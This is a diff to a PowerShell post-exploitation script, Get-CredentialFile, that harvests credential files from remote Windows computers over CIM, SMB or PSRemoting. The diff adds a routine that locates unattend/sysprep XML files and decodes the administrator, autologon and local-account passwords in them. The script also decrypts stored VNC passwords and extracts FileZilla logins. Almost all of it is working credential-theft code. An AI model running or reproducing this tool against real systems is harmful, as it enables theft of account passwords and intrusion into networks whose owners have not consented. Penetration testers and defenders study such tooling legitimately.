@@ -1,6 +1,6 @@
 #requires -version 3
 
-function Get-CredentialFile {
+Function Get-CredentialFile {
 <#
 .SYNOPSIS
     Get credentials from files located on a remote computer.
@@ -87,7 +87,7 @@ function Get-CredentialFile {
                 }
             }
         }
-        catch [System.Management.Automation.PSArgumentOutOfRangeException] {
+        catch [Management.Automation.PSArgumentOutOfRangeException] {
             Write-Warning "Alternative authentication method and/or protocol should be used with implicit credentials."
             break
         }
@@ -115,6 +115,7 @@ function Get-CredentialFile {
 
         # Common credential files
 
+        Get-UnattendCredentialFile -CimSession $cimSession -Download:$Download -Credential $Credential -PSSession $psSession
         Get-VncCredentialFile -CimSession $cimSession -Download:$Download -Credential $Credential -PSSession $psSession
 
         # User credential files
@@ -136,10 +137,6 @@ function Get-CredentialFile {
             # Sessions
             "MTPuTTy"                   = "\AppData\Roaming\TTYPlus\mtputty.xml"
             "ApacheDirectoryStudio"     = "\.ApacheDirectoryStudio\.metadata\.plugins\org.apache.directory.studio.connection.core\connections.xml"
-            # Interesting files
-            #"RDCMan-Config"                 = "\AppData\Local\Microsoft\Remote Desktop Connection Manager\RDCMan.settings"
-            #"KeePass-Config"                = "\AppData\Roaming\KeePass\KeePass.config.xml"
-            #"KeePass-MasterKey"             = "\AppData\Roaming\KeePass\ProtectedUserKey.bin"
         }
 
         Get-CimInstance -ClassName Win32_UserProfile -CimSession $cimSession -Verbose:$false | ForEach-Object {
@@ -152,13 +149,13 @@ function Get-CredentialFile {
                 $filter  = "Name='$filePath'"
                 $file = Get-CimInstance -ClassName CIM_LogicalFile -Filter $filter -CimSession $cimSession -Verbose:$false
                 if ($file.Name) {
-                    $obj = New-Object -TypeName psobject
-                    $obj | Add-Member -MemberType NoteProperty -Name 'ComputerName' -Value $ComputerName
-                    $obj | Add-Member -MemberType NoteProperty -Name 'Type' -Value $userFile.Key
-                    $obj | Add-Member -MemberType NoteProperty -Name 'Location' -Value $file.Name
-                    $obj | Add-Member -MemberType NoteProperty -Name 'CreationDate' -Value $file.CreationDate
-                    $obj | Add-Member -MemberType NoteProperty -Name 'LastModified' -Value $file.LastModified
-                    Write-Output $obj
+                    $result = New-Object -TypeName PSObject
+                    $result | Add-Member -MemberType NoteProperty -Name 'ComputerName' -Value $ComputerName
+                    $result | Add-Member -MemberType NoteProperty -Name 'Type' -Value $userFile.Key
+                    $result | Add-Member -MemberType NoteProperty -Name 'Location' -Value $file.Name
+                    $result | Add-Member -MemberType NoteProperty -Name 'CreationDate' -Value $file.CreationDate
+                    $result | Add-Member -MemberType NoteProperty -Name 'LastModified' -Value $file.LastModified
+                    Write-Output $result
                     if ($Download) {
                         $outputDir = "$PWD\$ComputerName"
                         $temp = $profilePath -split "\\"
@@ -184,7 +181,7 @@ function Get-CredentialFile {
     }
 }
 
-function Local:Get-VncCredentialFile {
+Function Local:Get-UnattendCredentialFile {
     Param (
         [Parameter(Mandatory = $True)]
         [CimSession]
@@ -203,7 +200,159 @@ function Local:Get-VncCredentialFile {
     )
 
     BEGIN {
-        function Local:Get-VncDecryptedPassword ([byte[]] $EncryptedPassword) {
+        # Adapted from PrivescCheck's Get-UnattendSensitiveData by @itm4n
+        Function Local:Get-UnattendSensitiveData {
+            [CmdletBinding()]
+            Param(
+                [Parameter(Mandatory=$true)]
+                [String]$Path
+            )
+
+            Function Local:Get-DecodedPassword {
+                [CmdletBinding()]
+                Param(
+                    [Object]$XmlNode
+                )
+
+                if ($XmlNode.GetType().Name -eq "string") {
+                    $XmlNode
+                }
+                else {
+                    if ($XmlNode) {
+                        if ($XmlNode.PlainText -eq "false") {
+                            [Text.Encoding]::Unicode.GetString([Convert]::FromBase64String($XmlNode.Value))
+                        }
+                        else {
+                            $XmlNode.Value
+                        }
+                    }
+                }
+            }
+
+            [xml] $xml = Get-Content -Path $Path -ErrorAction SilentlyContinue -ErrorVariable GetContentError
+            if (-not $GetContentError) {
+                $xml.GetElementsByTagName("Credentials") | ForEach-Object {
+                    $password = Get-DecodedPassword -XmlNode $_.Password
+                    if ((-not [String]::IsNullOrEmpty($password)) -and (-not ($password -eq "*SENSITIVE*DATA*DELETED*"))) {
+                        $result = New-Object -TypeName PSObject
+                        $result | Add-Member -MemberType "NoteProperty" -Name "Type" -Value "Credentials"
+                        $result | Add-Member -MemberType "NoteProperty" -Name "Domain" -Value $_.Domain
+                        $result | Add-Member -MemberType "NoteProperty" -Name "Username" -Value $_.Username
+                        $result | Add-Member -MemberType "NoteProperty" -Name "Password" -Value $password
+                        $result
+                    }
+                }
+
+                $xml.GetElementsByTagName("LocalAccount") | ForEach-Object {
+                    $password = Get-DecodedPassword -XmlNode $_.Password
+                    if ((-not [String]::IsNullOrEmpty($password)) -and (-not ($password -eq "*SENSITIVE*DATA*DELETED*"))) {
+                        $result = New-Object -TypeName PSObject
+                        $result | Add-Member -MemberType "NoteProperty" -Name "Type" -Value "LocalAccount"
+                        $result | Add-Member -MemberType "NoteProperty" -Name "Domain" -Value "N/A"
+                        $result | Add-Member -MemberType "NoteProperty" -Name "Username" -Value $_.Name
+                        $result | Add-Member -MemberType "NoteProperty" -Name "Password" -Value $password
+                        $result
+                    }
+                }
+
+                $xml.GetElementsByTagName("AutoLogon") | ForEach-Object {
+                    $password = Get-DecodedPassword -XmlNode $_.Password
+                    if ((-not [String]::IsNullOrEmpty($password)) -and (-not ($password -eq "*SENSITIVE*DATA*DELETED*"))) {
+                        $result = New-Object -TypeName PSObject
+                        $result | Add-Member -MemberType "NoteProperty" -Name "Type" -Value "AutoLogon"
+                        $result | Add-Member -MemberType "NoteProperty" -Name "Domain" -Value $_.Domain
+                        $result | Add-Member -MemberType "NoteProperty" -Name "Username" -Value $_.Username
+                        $result | Add-Member -MemberType "NoteProperty" -Name "Password" -Value $password
+                        $result
+                    }
+                }
+
+                $xml.GetElementsByTagName("AdministratorPassword") | ForEach-Object {
+                    $password = Get-DecodedPassword -XmlNode $_
+                    if ((-not [String]::IsNullOrEmpty($password)) -and (-not ($password -eq "*SENSITIVE*DATA*DELETED*"))) {
+                        $result = New-Object -TypeName PSObject
+                        $result | Add-Member -MemberType "NoteProperty" -Name "Type" -Value "AdministratorPassword"
+                        $result | Add-Member -MemberType "NoteProperty" -Name "Domain" -Value "N/A"
+                        $result | Add-Member -MemberType "NoteProperty" -Name "Username" -Value "N/A"
+                        $result | Add-Member -MemberType "NoteProperty" -Name "Password" -Value $password
+                        $result
+                    }
+                }
+            }
+        }
+
+        $ComputerName = $CimSession.ComputerName
+    }
+
+    PROCESS {
+        $commonFiles = @(
+            "C:\Windows\Panther\Unattended.xml"
+            "C:\Windows\Panther\Unattend.xml"
+            "C:\Windows\Panther\Unattend\Unattended.xml"
+            "C:\Windows\Panther\Unattend\Unattend.xml"
+            "C:\Windows\System32\Sysprep\Unattend.xml"
+            "C:\Windows\System32\Sysprep\Panther\Unattend.xml"
+        )
+
+        foreach ($commonFile in $commonFiles) {
+            $filePath = ($commonFile) -replace '\\','\\'
+            $filter  = "Name='$filePath'"
+            $file = Get-CimInstance -Class CIM_LogicalFile -Filter $filter -CimSession $CimSession -Verbose:$false
+            if ($file.Name) {
+                $result = New-Object -TypeName PSObject
+                $result | Add-Member -MemberType NoteProperty -Name 'ComputerName' -Value $ComputerName
+                $result | Add-Member -MemberType NoteProperty -Name 'Type' -Value 'Unattended'
+                $result | Add-Member -MemberType NoteProperty -Name 'Location' -Value $file.Name
+                $result | Add-Member -MemberType NoteProperty -Name 'CreationDate' -Value $file.CreationDate
+                $result | Add-Member -MemberType NoteProperty -Name 'LastModified' -Value $file.LastModified
+
+                if ($Download) {
+                    $outputDir = "$PWD\$ComputerName"
+                    $temp = $file.Name -split '\\'
+                    $outputFile = "$outputDir\$($temp.Get($temp.Count - 1))"
+                    New-Item -ItemType Directory -Force -Path $outputDir | Out-Null
+                    if ($PSSession) {
+                        Get-RemoteFile -Path $file.Name -Destination $outputFile -ComputerName $ComputerName -Protocol 'PSRemoting' -PSSession $PSSession
+                    }
+                    else {
+                        Get-RemoteFile -Path $file.Name -Destination $outputFile -ComputerName $ComputerName -Protocol 'SMB' -Credential $Credential
+                    }
+                    # Extract credentials from file
+                    if ($creds = Get-UnattendSensitiveData -Path $outputFile) {
+                        $result | Add-Member -MemberType NoteProperty -Name 'Credentials' -Value $creds
+                        Write-Output $result
+                    }
+                }
+                else {
+                    Write-Output $result
+                }
+            }
+        }
+    }
+
+    END {}
+}
+
+Function Local:Get-VncCredentialFile {
+    Param (
+        [Parameter(Mandatory = $True)]
+        [CimSession]
+        $CimSession,
+
+        [Switch]
+        $Download,
+
+        [Management.Automation.Runspaces.PSSession]
+        $PSSession,
+
+        [ValidateNotNullOrEmpty()]
+        [Management.Automation.PSCredential]
+        [Management.Automation.Credential()]
+        $Credential = [Management.Automation.PSCredential]::Empty
+    )
+
+    BEGIN {
+        Function Local:Get-VncDecryptedPassword ([byte[]] $EncryptedPassword) {
             if ($EncryptedPassword.Length -lt 8) {
                 return ""
             }
@@ -227,7 +376,7 @@ function Local:Get-VncCredentialFile {
             return [Text.Encoding]::UTF8.GetString($des.CreateDecryptor($key, $null).TransformFinalBlock($EncryptedPassword, 0, $EncryptedPassword.Length));
         }
 
-        function Local:HexStringToByteArray ([string] $HexString) {    
+        Function Local:HexStringToByteArray ([string] $HexString) {    
             $byteArray = New-Object Byte[] ($HexString.Length/2);
             for ($i = 0; $i -lt $HexString.Length; $i += 2) {
                 $byteArray[$i/2] = [Convert]::ToByte($HexString.Substring($i, 2), 16)
@@ -251,12 +400,12 @@ function Local:Get-VncCredentialFile {
             $filter  = "Name='$filePath'"
             $file = Get-CimInstance -Class CIM_LogicalFile -Filter $filter -CimSession $CimSession -Verbose:$false
             if ($file.Name) {
-                $obj = New-Object -TypeName psobject
-                $obj | Add-Member -MemberType NoteProperty -Name 'ComputerName' -Value $ComputerName
-                $obj | Add-Member -MemberType NoteProperty -Name 'Type' -Value 'VNC'
-                $obj | Add-Member -MemberType NoteProperty -Name 'Location' -Value $file.Name
-                $obj | Add-Member -MemberType NoteProperty -Name 'CreationDate' -Value $file.CreationDate
-                $obj | Add-Member -MemberType NoteProperty -Name 'LastModified' -Value $file.LastModified
+                $result = New-Object -TypeName PSObject
+                $result | Add-Member -MemberType NoteProperty -Name 'ComputerName' -Value $ComputerName
+                $result | Add-Member -MemberType NoteProperty -Name 'Type' -Value 'VNC'
+                $result | Add-Member -MemberType NoteProperty -Name 'Location' -Value $file.Name
+                $result | Add-Member -MemberType NoteProperty -Name 'CreationDate' -Value $file.CreationDate
+                $result | Add-Member -MemberType NoteProperty -Name 'LastModified' -Value $file.LastModified
 
                 if ($Download) {
                     $outputDir = "$PWD\$ComputerName"
@@ -270,7 +419,7 @@ function Local:Get-VncCredentialFile {
                         Get-RemoteFile -Path $file.Name -Destination $outputFile -ComputerName $ComputerName -Protocol 'SMB' -Credential $Credential
                     }
                     # Extract credentials from file
-                    $creds = New-Object -TypeName psobject
+                    $creds = New-Object -TypeName PSObject
                     $reader = New-Object IO.StreamReader($outputFile)
                     while (($line = $reader.ReadLine()) -ne $null) {
                         if ($line.Contains("passwd=")) {
@@ -286,9 +435,9 @@ function Local:Get-VncCredentialFile {
                         }
                     }
                     $reader.Close()
-                    $obj | Add-Member -MemberType NoteProperty -Name 'Credentials' -Value $creds
+                    $result | Add-Member -MemberType NoteProperty -Name 'Credentials' -Value $creds
                 }
-                Write-Output $obj
+                Write-Output $result
             }
         }
     }
@@ -296,7 +445,7 @@ function Local:Get-VncCredentialFile {
     END {}
 }
 
-function Local:Get-FilezillaCredentialFile {
+Function Local:Get-FilezillaCredentialFile {
     Param (
         [Parameter(Mandatory = $True)]
         [string]
@@ -333,12 +482,12 @@ function Local:Get-FilezillaCredentialFile {
             $filter  = "Name='$filePath'"
             $file = Get-CimInstance -Class CIM_LogicalFile -Filter $filter -CimSession $CimSession -Verbose:$false
             if ($file.Name) {
-                $obj = New-Object -TypeName psobject
-                $obj | Add-Member -MemberType NoteProperty -Name 'ComputerName' -Value $ComputerName
-                $obj | Add-Member -MemberType NoteProperty -Name 'Type' -Value 'FileZilla'
-                $obj | Add-Member -MemberType NoteProperty -Name 'Location' -Value $file.Name
-                $obj | Add-Member -MemberType NoteProperty -Name 'CreationDate' -Value $file.CreationDate
-                $obj | Add-Member -MemberType NoteProperty -Name 'LastModified' -Value $file.LastModified
+                $result = New-Object -TypeName PSObject
+                $result | Add-Member -MemberType NoteProperty -Name 'ComputerName' -Value $ComputerName
+                $result | Add-Member -MemberType NoteProperty -Name 'Type' -Value 'FileZilla'
+                $result | Add-Member -MemberType NoteProperty -Name 'Location' -Value $file.Name
+                $result | Add-Member -MemberType NoteProperty -Name 'CreationDate' -Value $file.CreationDate
+                $result | Add-Member -MemberType NoteProperty -Name 'LastModified' -Value $file.LastModified
 
                 if ($Download) {
                     $outputDir = "$PWD\$ComputerName"
@@ -378,9 +527,9 @@ function Local:Get-FilezillaCredentialFile {
                             $creds.Add((New-Object PSObject -Property $cred | Select-Object -Property Host,Port,User,Password)) | Out-Null
                         }
                     }
+                    $result | Add-Member -MemberType NoteProperty -Name 'Credentials' -Value $creds
                 }
-                $obj | Add-Member -MemberType NoteProperty -Name 'Credentials' -Value $creds
-                Write-Output $obj
+                Write-Output $result
             }
         }
     }
@@ -388,7 +537,7 @@ function Local:Get-FilezillaCredentialFile {
     END {}
 }
 
-function Local:Get-RemoteFile {
+Function Local:Get-RemoteFile {
     [CmdletBinding()]
     Param (
         [Parameter(Mandatory = $True)]
@@ -417,7 +566,7 @@ function Local:Get-RemoteFile {
     )
 
     BEGIN {
-        function Local:Get-StringHash ([String]$String, $Algorithm="MD5") { 
+        Function Local:Get-StringHash ([String]$String, $Algorithm="MD5") { 
             $stringBuilder = New-Object System.Text.StringBuilder 
             [Security.Cryptography.HashAlgorithm]::Create($Algorithm).ComputeHash([Text.Encoding]::UTF8.GetBytes($String)) | % { 
                 [Void]$stringBuilder.Append($_.ToString("x2")) 
